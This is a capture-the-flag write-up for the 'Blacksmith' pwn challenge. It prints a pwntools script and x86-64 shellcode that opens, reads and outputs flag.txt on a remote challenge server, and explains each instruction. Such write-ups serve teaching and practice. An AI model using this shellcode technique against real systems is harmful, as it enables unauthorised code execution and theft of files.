# Blacksmith Exploit Writeup

This document explains the exploit for the "Blacksmith" pwn challenge. The exploit leverages a buffer overflow vulnerability to execute a custom shellcode that reads the content of "flag.txt" from the server and prints it to the standard output.

## Exploit Analysis

The exploit is performed using a Python script with the `pwntools` library. Here is a step-by-step breakdown of the exploit's logic:

### 1. Connecting to the Service and Navigation

The script starts by connecting to the remote service:

```python
p = remote("94.237.57.211", 40894)
```

Then, it navigates through the application's menu to reach the vulnerable part of the program, which is related to crafting a "shield":

```python
p.sendlineafter(b"all!\n> ", b'1')
p.sendlineafter(b"\xf0\x9f\x8f\xb9\n> ", b'2')
```

### 2. The Shellcode

The core of the exploit is a custom shellcode written in assembly and assembled using `pwntools.asm`. This shellcode is designed to open, read, and print the content of "flag.txt".

Here is the assembly code for the shellcode:

```nasm
push r10
inc r10
mov rax, r10
lea rdi, [rip+31]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, r11
syscall

mov rdx, rax
pop rax
mov rdi, rax
syscall
```

Let's break down the shellcode's functionality:

#### a. Opening the Flag File

- `push r10`, `inc r10`, `mov rax, r10`: These instructions set up the `open` syscall. It's assumed that `r10` holds a value that, when incremented, becomes 2, which is the syscall number for `open`.
- `lea rdi, [rip+31]`: This instruction loads the address of the "flag.txt" string into the `rdi` register. The string is placed immediately after the shellcode, and `31` is the length of the shellcode itself. `rdi` holds the first argument for the `open` syscall (the filename).
- `xor rsi, rsi`, `xor rdx, rdx`: These instructions set the `rsi` (flags) and `rdx` (mode) registers to 0. This is equivalent to opening the file with `O_RDONLY`.
- `syscall`: This executes the `open("flag.txt", O_RDONLY)` syscall. The file descriptor of the opened file is returned in the `rax` register.

#### b. Reading the Flag Content

- `mov rsi, rdi`: The address of the "flag.txt" string (which was in `rdi`) is moved to `rsi`. This address will be used as the buffer to store the content of the flag. This means the filename will be overwritten by the file's content.
- `mov rdi, rax`: The file descriptor returned by the `open` syscall (in `rax`) is moved to `rdi`. `rdi` now holds the first argument for the `read` syscall.
- `xor rax, rax`: The `rax` register is cleared to 0, which is the syscall number for `read`.
- `mov rdx, r11`: The `rdx` register (the `count` argument for `read`) is set to the value of `r11`. The exploit assumes that `r11` contains a value large enough to read the entire flag.
- `syscall`: This executes the `read(fd, buffer, count)` syscall, reading the content of the flag into the buffer where the "flag.txt" string was stored.

#### c. Printing the Flag

- `mov rdx, rax`: The number of bytes read by the `read` syscall (returned in `rax`) is moved to `rdx`. This will be the `count` for the `write` syscall.
- `pop rax`: This restores the original value of `r10` (pushed at the beginning) into `rax`. It is assumed that the original value of `r10` was 1, which is the file descriptor for standard output.
- `mov rdi, rax`: The value from `rax` (assumed to be 1) is moved to `rdi`, which is the first argument for the `write` syscall (the file descriptor).
- `syscall`: This executes the `write(1, buffer, count)` syscall, printing the content of the flag to the standard output.

### 3. Sending the Exploit

The shellcode is combined with the "flag.txt" string and sent to the server:

```python
payload = asm(...)
payload += b"flag.txt"
p.sendafter(b"weapon?\n> ", payload)
```

### 4. Receiving the Flag

Finally, the script enters a loop to receive and print the output from the server, which will be the content of "flag.txt":

```python
while True:
    print(p.recvline())
```

## Conclusion

This exploit successfully demonstrates how a buffer overflow vulnerability can be used to execute arbitrary code on the server. By carefully crafting a shellcode, we can make the server read a sensitive file and send its content back to us.
